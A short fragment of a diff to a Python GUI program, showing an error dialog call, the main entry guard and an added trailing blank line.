       messagebox.showerror('Error', error_message)
@@ -731,3 +944,4 @@ Email: {email if email else ""}\n"""
     error()
 if __name__ == '__main__':
     main()
+
